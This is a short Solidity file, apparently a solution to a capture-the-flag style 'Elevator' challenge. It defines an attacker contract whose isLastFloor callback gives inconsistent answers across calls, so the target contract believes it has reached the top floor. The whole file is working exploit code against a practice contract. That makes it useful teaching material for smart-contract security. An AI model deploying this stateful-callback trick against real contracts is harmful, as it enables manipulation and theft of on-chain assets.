// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/11_Elevator.sol";

contract AttackerElevator {
    uint256 topFloor;

    function isLastFloor(uint256 floor) external returns (bool last) {
        last = floor == topFloor;

        topFloor = floor;
    }

    function exploit(address elevator) public {
        Elevator(elevator).goTo(3);
    }
}
